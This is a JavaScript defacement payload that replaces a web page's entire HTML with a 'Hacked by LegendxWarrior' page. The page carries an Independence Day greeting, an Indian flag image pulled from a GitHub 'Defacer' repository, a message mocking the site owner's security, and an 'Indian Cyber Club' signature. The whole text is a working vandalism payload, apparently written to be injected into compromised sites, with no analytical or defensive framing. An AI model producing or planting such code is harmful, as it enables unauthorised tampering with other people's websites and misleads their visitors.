document.querySelector("html").innerHTML = `
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Hacked by Legend</title>
  <link href="https://fonts.googleapis.com/css2?family=Marmelad&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #000;
      color: #fff;
      font-family: 'Marmelad', sans-serif;
      padding: 5vh 2vw;
      text-align: center;
    }

    .Main {
      font-size: 5vw;
      color: #FF0000;
      animation: main-anim 15s infinite;
    }

    .wish {
      font-size: 7vw;
      color: #FFF2F2;
      margin-top: 4vh;
      animation: wish-anim 10s infinite;
    }

    img {
      width: 80%;
      max-width: 500px;
      height: auto;
      margin-top: 5vh;
    }

    p {
      font-size: 4vw;
      max-width: 800px;
      margin: 5vh auto 0;
      background: linear-gradient(180deg, red, white, green);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      color: transparent;
    }

   .show {
      margin-top: 2vw;
      font-size: 3vw;
      color: red;
    }

    .about {
      font-size: 2vw;
      color: #FF8F04;
      margin-top: 6vh;
    }

    @media (min-width: 768px) {
      .Main {
        font-size: 3rem;
      }

      .wish {
        font-size: 4rem;
      }

      p, .show, .about {
        font-size: 1.2rem;
      }
    }

    @keyframes main-anim {
      0% { text-shadow: none; }
      50% {
        text-shadow: -2px -2px 0 #000, 2px 2px 0 #000,
                     15px 15px 15px #FF0000, -15px 15px 15px #FF0000,
                     15px -15px 20px #FF0000, -15px -15px 30px #FF0000;
      }
    }

    @keyframes wish-anim {
      0% { text-shadow: none; }
      30% {
        color: #00FF01;
        text-shadow: -6px -6px 0 #000, -2px 2px 0 #000, 2px -2px 0 #000,
                     15px 15px 15px #FF0000, -15px 15px 15px #FF0000,
                     15px -15px 20px #FF4600, -15px -15px 30px #FF4600;
      }
      50% { text-shadow: none; }
      80% {
        color: #FF5000;
        text-shadow: -2px -2px 0 #000, 6px 4px 0 #000,
                     15px 15px 15px #00ff3c, -15px 15px 15px #00FF3C,
                     15px -15px 20px #00ff3c, -15px -15px 30px #00ff3c;
      }
      100% { text-shadow: none; }
    }
  </style>
</head>
<body>
  <h1 class="Main">[+] Hacked by LegendxWarrior [+]</h1>
  <h1 class="wish"><strong>[ Happy Independence Day ]</strong></h1>
  <img src="https://raw.githubusercontent.com/legendxWarrior/Defacer/main/flag.jpg" alt="Indian Flag">
  <p>
    I find vulnerability and just compromised your system. You need to know more about security because you are a baby in cyber security. I laugh on your security that is compromised by a beginner hacker. I am an Indian and I just hacked your website to wish the Independence Day of India.
  </p>
  <div class="show">
    <h2>{ धर्मो रक्षति रक्षितः }<br>|| भारत माता की जय ||<br>🚩जय श्री राम 🚩<br>⚔️⚔️⚔️</h2>
  </div>
  <div class="about">
    <h1>[•]&nbsp;&nbsp;Legend&nbsp;&nbsp;[•]</h1>
    <h1>#Team ICC(<span style="color:red">Indian Cyber Club</span>)</h1>
  </div>
</body>
`;
